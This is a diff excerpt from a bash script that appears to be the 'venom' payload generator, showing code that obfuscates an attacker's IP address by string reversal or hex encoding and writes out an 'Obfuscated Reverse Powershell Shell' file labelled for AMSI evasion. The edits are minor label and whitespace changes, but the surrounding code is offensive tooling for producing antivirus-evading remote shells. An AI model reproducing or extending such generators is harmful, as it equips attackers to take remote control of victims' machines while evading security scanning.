@@ -13179,9 +13179,8 @@ if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
    xterm -T " Reversing Original String (ip addr)" -geometry 110x23 -e "rev <<< \"$lhost\" > /tmp/reverse.txt"
    revtcpip=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt > /dev/nul 2>&1
    
-
    echo "${BlueF}[☠]${white} Obfuscated ip address (rev):${GreenF}$revtcpip${white}";sleep 2
-   ## Build Reverse TCP Powershell Shell (hex obfuscated).
+   ## Build Reverse TCP Powershell Shell (PSrevStr obfuscated).
    echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
    echo "<#" > $IPATH/output/$NaM.ps1
    echo "Obfuscated (rev) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
@@ -13223,12 +13222,11 @@ else
    strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
    echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sleep 2
 
-
    ## Build Reverse TCP Powershell Shell (hex obfuscated).
    echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
    echo "<#" > $IPATH/output/$NaM.ps1
    echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
-   echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+   echo "Framework: venom v1.0.17 (shinigami)" >> $IPATH/output/$NaM.ps1
    echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
    echo "#>" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
